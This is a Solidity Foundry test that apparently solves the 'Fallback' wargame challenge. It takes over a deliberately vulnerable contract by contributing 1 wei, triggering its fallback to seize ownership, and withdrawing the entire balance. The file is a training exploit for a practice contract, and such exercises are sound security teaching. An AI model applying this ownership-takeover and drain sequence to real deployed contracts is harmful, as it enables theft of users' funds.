// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../src/Fallback.sol";
import "@forge-std/Test.sol";

contract FallbackTest is Test {

    Fallback public fallbackContract;
    address public attacker;
    function setUp() public {
        fallbackContract = new Fallback();
        attacker = vm.addr(1);
        vm.deal(attacker, 1 ether);
    }

    function testExploit() public {
        vm.startPrank(attacker);
        fallbackContract.contribute{value: 1 wei}();
        (bool success,) = address(fallbackContract).call{value: 1 wei}("");
        require(success, "Can't send the ether");
        fallbackContract.withdraw();
        vm.stopPrank();

        assertEq(address(fallbackContract).balance, 0);
        assertEq(attacker, fallbackContract.owner());
    }
}
